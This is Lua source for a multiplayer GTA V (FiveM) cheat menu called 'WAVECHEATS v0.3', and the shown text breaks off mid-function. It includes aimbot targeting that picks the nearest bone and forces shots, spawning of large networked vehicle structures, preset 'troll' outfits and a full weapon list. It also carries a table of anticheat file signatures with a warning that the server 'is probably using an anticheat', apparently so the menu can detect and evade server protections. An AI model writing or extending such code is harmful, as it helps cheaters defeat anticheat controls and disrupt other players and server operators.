local a = nil
local b = 125
local c = false
local d = { ['Menu sounds'] = true, ['Freecam speed'] = 1, ['Freecam object'] = 1 }
local e, f = 0.9, 0.503
local g = {}
local h = 0
local i = {}
local j, k, l = false, 0, nil
local m = {}
local n
local o = {}
local p = {}
local q = {}
local r = { 'no sounds' }
local s = 50
local t = false
local u = 0.25
local v = 'body'
local w, x = 'SUNNY', 0
local y = 'WAVECHEATS v0.3'
local z = false
local A = {}
local B = 0
local C = false
local D = { ['Container'] = 'prop_container_03b', ['Ramp'] = 'prop_mp_ramp_03', ['Wall'] = 'prop_const_fence02b' }
local E = {}
for F, G in pairs(D) do
    table.insert(E, F)
end
local function H(I)
    local J = math.rad(I.z)
    local K = math.rad(I.x)
    local L = math.abs(math.cos(K))
    return vector3(-math.sin(J) * L, math.cos(J) * L, math.sin(K))
end
local M = function(N, O)
    if IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(N, O, 9, 1)
    end
    if IsDisabledControlJustReleased(0, 32) or IsDisabledControlJustReleased(0, 33) then
        TaskVehicleTempAction(N, O, 6, 2500)
    end
    if IsDisabledControlPressed(0, 33) and not IsDisabledControlPressed(0, 32) then
        TaskVehicleTempAction(N, O, 22, 1)
    end
    if IsDisabledControlPressed(0, 34) and IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(N, O, 13, 1)
    end
    if IsDisabledControlPressed(0, 35) and IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(N, O, 14, 1)
    end
    if IsDisabledControlPressed(0, 32) and IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(N, O, 30, 100)
    end
    if IsDisabledControlPressed(0, 34) and IsDisabledControlPressed(0, 32) then
        TaskVehicleTempAction(N, O, 7, 1)
    end
    if IsDisabledControlPressed(0, 35) and IsDisabledControlPressed(0, 32) then
        TaskVehicleTempAction(N, O, 8, 1)
    end
    if IsDisabledControlPressed(0, 34) and not IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(N, O, 4, 1)
    end
    if IsDisabledControlPressed(0, 35) and not IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
        TaskVehicleTempAction(N, O, 5, 1)
    end
end
local P = false
CreateThread(function()
    while true do
        if P then
            for Q = 0, 400 do
                DisableControlAction(0, Q, true)
            end
            Wait(0)
        else
            Wait(250)
        end
    end
end)
local R = { ['Robot'] = { ['Original'] = 't20', ['Attach'] = { { vec3(6.0, -0.5, 0.5), vec3(0.0, 0.0, 0.0), 'phantom2' }, { vec3(-6.0, -0.5, 0.5), vec3(0.0, 0.0, 0.0), 'phantom2' }, { vec3(6.0, -3.5, 4.5), vec3(-90.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, -3.5, 4.5), vec3(-90.0, 0.0, 0.0), 'rhino' }, { vec3(6.0, -3.5, 11.5), vec3(-90.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, -3.5, 11.5), vec3(-90.0, 0.0, 0.0), 'rhino' }, { vec3(6.0, -1.5, 8.5), vec3(-90.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, -1.5, 8.5), vec3(-90.0, 0.0, 0.0), 'rhino' }, { vec3(6.0, -3.5, 15.0), vec3(25.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, -3.5, 15.0), vec3(25.0, 0.0, 0.0), 'rhino' }, { vec3(3.0, -3.5, 15.0), vec3(25.0, 0.0, 0.0), 'rhino' }, { vec3(-3.0, -3.5, 15.0), vec3(25.0, 0.0, 0.0), 'rhino' }, { vec3(0.0, -3.5, 15.0), vec3(25.0, 0.0, 0.0), 'rhino' }, { vec3(6.0, 1.0, 20.0), vec3(110.0, 0.0, -180.0), 'rhino' }, { vec3(-6.0, 1.0, 20.0), vec3(110.0, 0.0, -180.0), 'rhino' }, { vec3(3.0, 1.0, 20.0), vec3(110.0, 0.0, -180.0), 'rhino' }, { vec3(-3.0, 1.0, 20.0), vec3(110.0, 0.0, -180.0), 'rhino' }, { vec3(0.0, 1.0, 20.0), vec3(110.0, 0.0, -180.0), 'rhino' }, { vec3(6.0, 1.0, 24.0), vec3(-75.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, 1.0, 24.0), vec3(-75.0, 0.0, 0.0), 'rhino' }, { vec3(3.0, 1.0, 24.0), vec3(-75.0, 0.0, 0.0), 'rhino' }, { vec3(-3.0, 1.0, 24.0), vec3(-75.0, 0.0, 0.0), 'rhino' }, { vec3(0.0, 1.0, 24.0), vec3(-75.0, 0.0, 0.0), 'rhino' }, { vec3(6.0, -6.5, 18.0), vec3(85.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, -6.5, 18.0), vec3(85.0, 0.0, 0.0), 'rhino' }, { vec3(3.0, -6.5, 18.0), vec3(85.0, 0.0, 0.0), 'rhino' }, { vec3(-3.0, -6.5, 18.0), vec3(85.0, 0.0, 0.0), 'rhino' }, { vec3(0.0, -6.5, 18.0), vec3(85.0, 0.0, 0.0), 'rhino' }, { vec3(6.0, -5.5, 23.0), vec3(65.0, 0.0, 0.0), 'rhino' }, { vec3(-6.0, -5.5, 23.0), vec3(65.0, 0.0, 0.0), 'rhino' }, { vec3(3.0, -5.5, 23.0), vec3(65.0, 0.0, 0.0), 'rhino' }, { vec3(-3.0, -5.5, 23.0), vec3(65.0, 0.0, 0.0), 'rhino' }, { vec3(0.0, -5.5, 23.0), vec3(65.0, 0.0, 0.0), 'rhino' }, { vec3(7.0, -4.5, 19.0), vec3(90.0, 0.0, 90.0), 'rhino' }, { vec3(7.0, -1.0, 20.0), vec3(90.0, 0.0, 90.0), 'rhino' }, { vec3(7.0, -2.0, 25.0), vec3(90.0, -110.0, 90.0), 'rhino' }, { vec3(-7.0, -4.5, 19.0), vec3(90.0, 0.0, -90.0), 'rhino' }, { vec3(-7.0, -1.0, 20.0), vec3(90.0, 0.0, -90.0), 'rhino' }, { vec3(-7.0, -2.0, 25.0), vec3(90.0, 110.0, -90.0), 'rhino' }, { vec3(6.0, -1.5, 26.0), vec3(-25.0, 0.0, 180.0), 'rhino' }, { vec3(-6.0, -1.5, 26.0), vec3(-25.0, 0.0, 180.0), 'rhino' }, { vec3(3.0, -1.5, 26.0), vec3(-25.0, 0.0, 180.0), 'rhino' }, { vec3(-3.0, -1.5, 26.0), vec3(-25.0, 0.0, 180.0), 'rhino' }, { vec3(0.0, -1.5, 26.0), vec3(-25.0, 0.0, 180.0), 'rhino' }, { vec3(0.0, -1.5, 29.0), vec3(-45.0, 0.0, 0.0), 'rhino' }, { vec3(0.0, -4.5, 29.0), vec3(-75.0, 0.0, -180.0), 'rhino' }, { vec3(0.0, -3.5, 33.0), vec3(-25.0, 0.0, 0.0), 'savage', 'drive' }, { vec3(6.0, -1.5, 30.0), vec3(-25.0, 0.0, 90.0), 'rhino' }, { vec3(5.0, -1.5, 29.0), vec3(0.0, 90.0, 90.0), 'rhino' }, { vec3(12.0, -1.5, 30.0), vec3(15.0, 0.0, 90.0), 'rhino' }, { vec3(17.0, -1.5, 26.0), vec3(75.0, 0.0, 90.0), 'rhino' }, { vec3(18.0, 0.5, 23.0), vec3(-25.0, 0.0, 0.0), 'rhino' }, { vec3(18.0, 5.5, 20.5), vec3(-25.0, 0.0, 0.0), 'rhino' }, { vec3(18.0, 7.5, 18.5), vec3(25.0, 180.0, 0.0), 'phantom2' }, { vec3(18.0, 8.5, 20.5), vec3(-25.0, 0.0, 0.0), 'lazer' }, { vec3(-6.0, -1.5, 30.0), vec3(-25.0, 0.0, -90.0), 'rhino' }, { vec3(-5.0, -1.5, 29.0), vec3(0.0, 270.0, -90.0), 'rhino' }, { vec3(-12.0, -1.5, 30.0), vec3(15.0, 0.0, -90.0), 'rhino' }, { vec3(-17.0, -1.5, 26.0), vec3(75.0, 0.0, -90.0), 'rhino' }, { vec3(-18.0, 0.5, 23.0), vec3(-25.0, 0.0, 0.0), 'rhino' }, { vec3(-18.0, 5.5, 20.5), vec3(-25.0, 0.0, 0.0), 'rhino' }, { vec3(-18.0, 7.5, 18.5), vec3(25.0, 180.0, 0.0), 'phantom2' }, { vec3(-18.0, 8.5, 20.5), vec3(-25.0, 0.0, 0.0), 'lazer' } } } }
local S = function(model)
    if type(model) == 'string' then
        model = GetHashKey(model)
    else
        if type(model) ~= 'number' then
            return false
        end
    end
    local T = GetGameTimer() + 5000
    while not HasModelLoaded(model) do
        Wait(0)
        RequestModel(model)
        if GetGameTimer() >= T then
            return false
        end
    end
    return model
end
local U = { ['body'] = 0, ['head'] = 31086, ['pelvis'] = 11816, ['left foot'] = 14201, ['right foot'] = 52301, ['right calf'] = 36864, ['left calf'] = 63931 }
local V = { ['ferris wheel'] = 'prop_ld_ferris_wheel', ['container'] = 'prop_container_05a', ['ufo'] = 'p_spinning_anus_s', ['gas tank'] = 'prop_gas_tank_01a', ['helicopter'] = 'p_crahsed_heli_s' }
local W = false
local X = print
local print = function(...)
    if W then
        print(('[^1%s^0] %s'):format(y, ...))
    end
end
local Y = { { 'client.lua', 'math.ldexp' }, { 'client.lua', "oldPrint('^2[NSAC] '..trash..'^0')" }, { 'io_anticheat.lua', "function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919))" }, { 'jesus_on_water.js', "var machinetherapist_0x1480=" }, { '__resource.lua', 'nui/rote_jesus.wav' } }
local Z
local _, a0 = { 255, 255, 255, 255 }, true
local a1 = { "WEAPON_KNIFE", "WEAPON_MINIGUN", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL" }
local a2 = { ['troll 1'] = json.decode('{"sun_1":0,"eyebrows_2":10,"bodyb_1":0,"age_1":0,"makeup_4":0,"bags_1":0,"skin":2,"pants_2":0,"blush_2":0,"complexion_2":0,"tshirt_2":0,"chest_3":0,"beard_4":0,"sun_2":0,"lipstick_4":0,"shoes_1":34,"mask_2":12,"chest_2":0,"makeup_1":0,"shoes_2":0,"torso_2":0,"arms":15,"watches_1":-1,"lipstick_3":0,"helmet_2":0,"decals_2":0,"ears_1":-1,"eyebrows_4":0,"sex":0,"beard_3":0,"helmet_1":-1,"moles_1":0,"chain_1":0,"bags_2":0,"pants_1":21,"face":0,"chest_1":0,"eye_color":0,"chain_2":0,"lipstick_1":0,"arms_2":0,"eyebrows_3":0,"beard_2":10,"beard_1":10,"ears_2":0,"makeup_3":0,"blush_1":0,"glasses_1":0,"blemishes_2":0,"hair_1":0,"mask_1":49,"decals_1":0,"blush_3":0,"bracelets_1":-1,"bproof_1":0,"bodyb_2":0,"moles_2":0,"hair_2":0,"tshirt_1":15,"lipstick_2":0,"torso_1":15,"hair_color_1":0,"glasses_2":0,"bracelets_2":0,"bproof_2":0,"eyebrows_1":27,"age_2":0,"blemishes_1":0,"hair_color_2":0,"watches_2":0,"makeup_2":0,"complexion_1":0}'), ['troll 2'] = json.decode('{"chest_1":0,"arms":0,"bracelets_1":-1,"chest_2":0,"chain_1":0,"lipstick_3":0,"decals_2":0,"age_1":0,"face":7,"blush_2":0,"shoes_1":1,"bodyb_1":0,"blush_3":0,"blush_1":0,"hair_1":7,"hair_color_2":0,"ears_2":0,"lipstick_1":0,"beard_3":0,"complexion_2":0,"chain_2":0,"sex":0,"eyebrows_2":10,"pants_1":6,"bracelets_2":0,"blemishes_2":0,"decals_1":0,"torso_2":0,"chest_3":0,"mask_2":0,"helmet_2":0,"bodyb_2":0,"makeup_2":0,"eyebrows_4":0,"hair_color_1":11,"age_2":0,"eye_color":0,"eyebrows_3":0,"bags_2":0,"beard_1":10,"makeup_1":0,"moles_1":0,"beard_2":10,"watches_2":0,"watches_1":-1,"makeup_3":0,"shoes_2":0,"helmet_1":-1,"sun_1":0,"beard_4":0,"moles_2":0,"skin":2,"glasses_1":0,"bproof_1":0,"lipstick_4":0,"makeup_4":0,"complexion_1":0,"blemishes_1":0,"sun_2":0,"glasses_2":0,"bproof_2":0,"ears_1":-1,"torso_1":0,"pants_2":0,"mask_1":0,"eyebrows_1":27,"hair_2":0,"tshirt_2":0,"tshirt_1":0,"bags_1":0,"arms_2":0,"lipstick_2":0}'), ['troll 3'] = json.decode('{"blush_1":0,"lipstick_1":0,"shoes_2":0,"torso_1":15,"face":24,"moles_1":0,"mask_1":49,"chain_1":0,"hair_color_2":0,"eye_color":0,"arms_2":0,"bodyb_2":0,"hair_color_1":0,"tshirt_2":0,"watches_2":0,"bproof_2":0,"mask_2":7,"makeup_1":0,"chest_3":0,"makeup_3":0,"shoes_1":34,"age_2":0,"beard_4":0,"lipstick_3":0,"complexion_1":0,"beard_1":10,"chest_1":0,"makeup_4":0,"chest_2":0,"bracelets_1":-1,"skin":5,"blemishes_2":0,"decals_2":0,"hair_2":0,"bproof_1":0,"pants_2":4,"age_1":0,"decals_1":0,"blush_2":0,"ears_1":-1,"blemishes_1":0,"chain_2":0,"glasses_1":0,"bodyb_1":0,"sun_2":0,"bracelets_2":0,"blush_3":0,"helmet_2":0,"moles_2":0,"torso_2":0,"sun_1":0,"sex":0,"complexion_2":0,"watches_1":-1,"eyebrows_4":0,"eyebrows_2":10,"beard_3":0,"beard_2":10,"arms":5,"eyebrows_3":0,"bags_1":0,"pants_1":56,"lipstick_2":0,"hair_1":0,"lipstick_4":0,"tshirt_1":131,"makeup_2":0,"bags_2":0,"glasses_2":0,"ears_2":0,"helmet_1":-1,"eyebrows_1":0}'), ['troll 4'] = json.decode('{"eyebrows_4":0,"lipstick_1":0,"shoes_2":9,"torso_1":2,"face":0,"moles_1":0,"mask_1":0,"chain_1":0,"hair_color_2":0,"hair_1":51,"eyebrows_3":0,"bodyb_2":0,"hair_color_1":2,"tshirt_2":1,"watches_2":0,"chain_2":0,"mask_2":0,"makeup_1":0,"chest_3":0,"makeup_3":0,"shoes_1":57,"bodyb_1":0,"beard_4":0,"lipstick_3":0,"complexion_1":0,"beard_1":10,"arms":43,"makeup_4":0,"chest_2":0,"bracelets_1":-1,"skin":8,"blemishes_2":0,"decals_2":0,"hair_2":0,"bproof_1":0,"pants_2":11,"age_1":0,"decals_1":0,"blush_2":0,"ears_1":-1,"complexion_2":0,"helmet_2":0,"glasses_1":0,"blush_1":0,"sun_2":0,"blush_3":0,"arms_2":0,"bproof_2":0,"moles_2":0,"torso_2":9,"sun_1":0,"chest_1":0,"bags_1":0,"watches_1":-1,"eyebrows_2":10,"lipstick_2":0,"beard_3":0,"blemishes_1":0,"sex":0,"age_2":0,"eye_color":3,"pants_1":2,"beard_2":10,"bracelets_2":0,"lipstick_4":0,"tshirt_1":59,"makeup_2":0,"bags_2":0,"glasses_2":0,"ears_2":0,"helmet_1":-1,"eyebrows_1":12}'), ['troll 5'] = json.decode('{"eyebrows_1":0,"mask_1":0,"moles_1":0,"complexion_1":0,"hair_color_1":0,"bproof_1":16,"glasses_2":0,"bracelets_2":0,"sex":0,"lipstick_1":0,"hair_color_2":0,"bproof_2":1,"arms":15,"bodyb_1":0,"shoes_2":0,"decals_2":0,"age_2":0,"bodyb_2":0,"helmet_1":-1,"face":24,"makeup_2":0,"lipstick_3":0,"ears_2":0,"beard_3":0,"blemishes_2":0,"makeup_1":0,"mask_2":0,"chain_2":0,"ears_1":-1,"tshirt_1":15,"blemishes_1":0,"pants_1":16,"beard_4":0,"hair_2":0,"blush_2":0,"chest_3":0,"sun_1":0,"eye_color":0,"lipstick_4":0,"lipstick_2":0,"arms_2":0,"eyebrows_3":0,"moles_2":0,"torso_1":15,"eyebrows_2":0,"complexion_2":0,"bracelets_1":-1,"blush_1":0,"sun_2":0,"watches_2":0,"makeup_4":0,"pants_2":6,"bags_2":0,"blush_3":0,"chest_2":10,"watches_1":-1,"chain_1":0,"torso_2":0,"beard_1":22,"glasses_1":16,"makeup_3":0,"skin":0,"helmet_2":0,"chest_1":0,"hair_1":16,"beard_2":10,"age_1":0,"shoes_1":0,"decals_1":0,"eyebrows_4":0,"tshirt_2":0,"bags_1":0}'), ['Legit 1'] = json.decode('{"torso_1":13,"shoes_2":2,"shoes_1":8,"chest_1":4,"eyebrows_3":0,"bags_2":0,"beard_3":0,"chest_3":5,"makeup_1":0,"helmet_1":-1,"decals_2":0,"blush_3":0,"mask_2":0,"ears_1":3,"moles_2":0,"moles_1":0,"chain_1":11,"watches_1":4,"age_1":7,"bodyb_1":2,"bproof_2":0,"blush_2":0,"eyebrows_4":0,"mask_1":0,"eyebrows_2":10,"tshirt_1":20,"bracelets_2":0,"blush_1":6,"lipstick_4":0,"arms_2":0,"glasses_2":0,"bags_1":0,"lipstick_2":0,"eyebrows_1":0,"sun_2":5,"lipstick_1":0,"lipstick_3":0,"blemishes_1":0,"pants_1":7,"chain_2":2,"skin":4,"hair_1":46,"age_2":0,"sex":0,"bodyb_2":2,"bracelets_1":0,"blemishes_2":0,"makeup_3":0,"eye_color":3,"face":0,"glasses_1":5,"hair_color_2":0,"beard_1":7,"makeup_2":0,"beard_4":0,"arms":0,"decals_1":0,"pants_2":0,"chest_2":3,"torso_2":0,"complexion_2":3,"hair_2":0,"bproof_1":0,"ears_2":2,"beard_2":9,"tshirt_2":0,"helmet_2":0,"complexion_1":9,"makeup_4":0,"hair_color_1":4,"sun_1":9,"watches_2":0}'), ['Legit 2'] = json.decode('{"eyebrows_2":0,"beard_4":0,"chest_1":0,"complexion_1":0,"blush_1":0,"glasses_1":2,"mask_1":0,"bags_1":0,"ears_1":-1,"decals_2":0,"tshirt_1":5,"blush_2":0,"complexion_2":0,"lipstick_4":0,"shoes_2":0,"hair_color_1":1,"bproof_1":0,"decals_1":0,"moles_1":0,"beard_3":20,"blemishes_2":0,"bags_2":0,"pants_1":23,"eye_color":0,"chain_2":0,"bodyb_2":0,"bracelets_2":0,"sun_1":0,"moles_2":0,"blush_3":0,"hair_color_2":0,"helmet_2":0,"lipstick_3":0,"hair_2":0,"torso_1":253,"shoes_1":25,"hair_1":19,"glasses_2":0,"eyebrows_3":0,"face":0,"age_1":0,"skin":0,"beard_2":8,"ears_2":0,"age_2":0,"bodyb_1":0,"arms":0,"torso_2":0,"chain_1":0,"tshirt_2":0,"bproof_2":0,"makeup_4":0,"chest_3":0,"makeup_3":0,"mask_2":0,"bracelets_1":-1,"makeup_1":0,"pants_2":1,"lipstick_2":0,"eyebrows_1":0,"chest_2":0,"lipstick_1":0,"eyebrows_4":0,"watches_2":0,"watches_1":-1,"blemishes_1":0,"arms_2":0,"sex":0,"helmet_1":-1,"makeup_2":0,"beard_1":11,"sun_2":0}'), ['Legit 3'] = json.decode('{"watches_1":14,"pants_2":0,"bproof_1":0,"ears_1":-1,"mask_1":0,"age_2":0,"bags_1":0,"bproof_2":0,"makeup_4":0,"lipstick_4":0,"bracelets_2":0,"mask_2":0,"beard_3":0,"torso_1":190,"eyebrows_4":0,"eyebrows_2":9,"tshirt_1":15,"decals_2":0,"makeup_1":0,"chain_1":0,"ears_2":0,"eyebrows_3":0,"chest_1":0,"sun_2":0,"beard_1":0,"blemishes_1":0,"complexion_1":0,"blush_1":0,"glasses_2":1,"makeup_2":0,"decals_1":0,"sex":0,"hair_1":19,"complexion_2":0,"glasses_1":5,"chest_2":0,"bodyb_2":0,"hair_color_2":0,"bracelets_1":-1,"chest_3":0,"bodyb_1":0,"pants_1":78,"beard_4":0,"tshirt_2":0,"moles_1":0,"shoes_2":1,"watches_2":0,"eyebrows_1":0,"blush_2":0,"arms":0,"bags_2":0,"lipstick_3":0,"moles_2":0,"makeup_3":0,"helmet_2":0,"lipstick_2":0,"hair_color_1":1,"eye_color":0,"arms_2":0,"helmet_1":-1,"hair_2":1,"beard_2":0,"blush_3":0,"lipstick_1":0,"blemishes_2":0,"skin":4,"age_1":0,"torso_2":0,"sun_1":0,"face":0,"shoes_1":75,"chain_2":0}'), ['Legit 4'] = json.decode('{"lipstick_4":0,"shoes_2":0,"ears_2":0,"eye_color":0,"decals_1":0,"sun_1":0,"chain_1":28,"skin":4,"sun_2":0,"hair_color_2":29,"bproof_1":0,"eyebrows_4":0,"complexion_1":0,"beard_4":0,"beard_2":0,"torso_2":0,"glasses_1":17,"helmet_1":-1,"chest_2":0,"torso_1":29,"mask_2":0,"decals_2":0,"arms_2":0,"tshirt_2":0,"tshirt_1":31,"moles_1":0,"arms":17,"mask_1":0,"hair_color_1":29,"bodyb_2":0,"eyebrows_3":28,"sex":0,"ears_1":-1,"beard_1":0,"eyebrows_1":17,"lipstick_2":0,"pants_1":28,"watches_1":-1,"hair_2":4,"blush_2":0,"blush_1":0,"helmet_2":0,"bodyb_1":0,"beard_3":0,"shoes_1":10,"makeup_2":0,"bags_2":0,"bracelets_2":0,"glasses_2":9,"age_1":14,"blemishes_2":0,"makeup_1":0,"bracelets_1":-1,"lipstick_3":0,"face":1,"lipstick_1":0,"age_2":10,"makeup_3":0,"pants_2":0,"complexion_2":0,"blush_3":0,"hair_1":18,"chain_2":2,"blemishes_1":0,"bags_1":0,"chest_1":0,"makeup_4":0,"moles_2":0,"watches_2":0,"chest_3":0,"bproof_2":0,"eyebrows_2":10}') }
local a3 = function(a4, a5, a6)
    local a7, a8, a9 = World3dToScreen2d(table.unpack(a5))
    SetTextScale(a6 or 0.25, a6 or 0.25)
    SetTextFont(0)
    SetTextColour(255, 255, 255, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    SetTextCentre(1)
    AddTextComponentString(a4)
    DrawText(a8, a9)
end
local aa = function(entity, ab)
    local ac, ad = GetModelDimensions(GetEntityModel(entity))
    local ae = 0.001
    local af = { GetOffsetFromEntityInWorldCoords(entity, ac.x - ae, ac.y - ae, ac.z - ae), GetOffsetFromEntityInWorldCoords(entity, ad.x + ae, ac.y - ae, ac.z - ae), GetOffsetFromEntityInWorldCoords(entity, ad.x + ae, ad.y + ae, ac.z - ae), GetOffsetFromEntityInWorldCoords(entity, ac.x - ae, ad.y + ae, ac.z - ae), GetOffsetFromEntityInWorldCoords(entity, ac.x - ae, ac.y - ae, ad.z + ae), GetOffsetFromEntityInWorldCoords(entity, ad.x + ae, ac.y - ae, ad.z + ae), GetOffsetFromEntityInWorldCoords(entity, ad.x + ae, ad.y + ae, ad.z + ae), GetOffsetFromEntityInWorldCoords(entity, ac.x - ae, ad.y + ae, ad.z + ae) }
    local ag = { { af[1], af[2] }, { af[2], af[3] }, { af[3], af[4] }, { af[4], af[1] }, { af[5], af[6] }, { af[6], af[7] }, { af[7], af[8] }, { af[8], af[5] }, { af[1], af[5] }, { af[2], af[6] }, { af[3], af[7] }, { af[4], af[8] } }
    for F, G in pairs(ag) do
        DrawLine(G[1]['x'], G[1]['y'], G[1]['z'], G[2]['x'], G[2]['y'], G[2]['z'], table.unpack(ab))
    end
end
local ah = function(ai, aj, ak)
    AddTextEntry('FMMC_KEY_TIP1', ai)
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", aj, "", "", "", ak)
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        local al = GetOnscreenKeyboardResult()
        Wait(500)
        return al
    else
        Wait(500)
        return false
    end
end
local am = function(an, ao)
    local ap = {}
    for F, G in pairs({ 0, 2, 4 }) do
        local aq = GetGameTimer() / 200
        table.insert(ap, math.floor(math.sin(aq * (an or 0.2) + G) * 127 + 128))
    end
    table.insert(ap, 255)
    if a0 or not ao then
        return ap
    else
        return _
    end
end
local ar = function(as, at, au, ab, a6, av, aw, ax)
    if au then
        SetTextColour(table.unpack(am(ax or 0.7, true)))
    else
        local ay, az, aA = table.unpack(ab or { 125, 125, 125 })
        SetTextColour(ay, az, aA, 255)
    end
    SetTextFont(0)
    SetTextScale(a6 or 0.3, a6 or 0.3)
    if aw then
        SetTextCentre(true)
    end
    SetTextCentre(false)
    SetTextEdge(1, 0, 0, 0, 205)
    SetTextEntry("STRING")
    AddTextComponentString(as)
    DrawText(av or e - 0.082, at)
end
local aB = function(a4)
    CreateThread(function()
        local T = GetGameTimer() + 1500
        while T >= GetGameTimer() do
            Wait(0)
            ar(a4, 0.3, false, { 255, 0, 0 }, 0.5, 0.5, true, 0.1)
        end
    end)
end
local aC = function()
    CreateThread(function()
        local T = GetGameTimer() + 1500
        while T >= GetGameTimer() do
            Wait(0)
            ar('This server is probably using an anticheat. This action has been blocked.', 0.3, false, { 255, 0, 0 }, 0.5, 0.5, true, 0.1)
        end
    end)
end
local aD = { ['Object'] = { FindFirstObject, FindNextObject, EndFindObject }, ['Ped'] = { FindFirstPed, FindNextPed, EndFindPed }, ['Vehicle'] = { FindFirstVehicle, FindNextVehicle, EndFindVehicle } }
local aE = function(aF)
    local aG, aH = 10000.0, 10000.0
    for F, G in pairs(U) do
        local aI, a8, a9 = GetScreenCoordFromWorldCoord(table.unpack(GetPedBoneCoords(aF, G, 0, 0, 0)))
        local aJ = math.abs(0.5 - a8) + math.abs(0.5 - a9)
        if aJ < aH then
            aH = aJ
            aG = G
        end
    end
    return aG
end
local aK = function()
end
local aL = function(type)
    local aM = {}
    local aN = aD[type]
    local aO, aP, aQ = aN[1]()
    repeat aQ, entity = aN[2](aO)
        if DoesEntityExist(entity) then
            table.insert(aM, entity)
        end until not aQ
    aN[3](aO)
    return aM
end
local aR = function(aS)
    if type(aS) == 'vector3' then
        if aS['x'] and aS['y'] and aS['z'] then
            if IsPedArmed(PlayerPedId(), 4) then
                if IsPedWeaponReadyToShoot(PlayerPedId()) then
                    SetPedShootsAtCoord(PlayerPedId(), aS, true)
                end
            end
        end
    end
end
local aT = function(aM)
    local aU = aM['Items'][aM['Current']]
    local aV = R[aU]
    if aV then
        CreateThread(function()
            local model = S(aV['Original'])
            local aW = 0
            if model ~= false then
                local aX = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 3.0, 0.0), GetEntityHeading(PlayerPedId()), true)
                local aY = aV['Attach']
                local aZ = {}
                local a_ = 0
                local b0 = false
                for F, G in pairs(aY) do
                    model = S(G[3])
                    local b1 = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 0.0, 150.0), 0.0, true)
                    table.insert(aZ, b1)
                    AttachEntityToEntity(b1, aX, 0, G[1], G[2], false, false, false, false, 0, true)
                    if G[4] then
                        if G[4] == 'drive' then
                            a_ = b1
                        end
                    end
                end
                local l = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                CreateThread(function()
                    RenderScriptCams(1, 0, 0, 1, 1)
                    SetCamActive(l, true)
                    local b2 = 0.0
                    local b3 = 0.0
                    local b4 = 0.0
                    while DoesCamExist(l) do
                        Wait(0)
                        b2 = b2 - GetDisabledControlNormal(1, 2) * 8.0
                        b4 = b4 - GetDisabledControlNormal(1, 1) * 8.0
                        if b2 > 90.0 then
                            b2 = 90.0
                        elseif b2 < -90.0 then
                            b2 = -90.0
                        end
                        if b3 > 90.0 then
                            b3 = 90.0
                        elseif b3 < -90.0 then
                            b3 = -90.0
                        end
                        if b4 > 360.0 then
                            b4 = b4 - 360.0
                        elseif b4 < -360.0 then
                            b4 = b4 + 360.0
                        end
                        local b5
                        if b0 then
                            b5 = GetEntityRotation(a_, 2)
                        else
                            b5 = GetEntityRotation(aX, 2)
                        end
                        if b0 then
                            SetCamCoord(l, GetOffsetFromEntityInWorldCoords(aX, 0.0, -25.0, 47.0))
                        else
                            local b6 = b4 / 18.0
                            if b6 > 10.5 then
                                b6 = b6 - 21
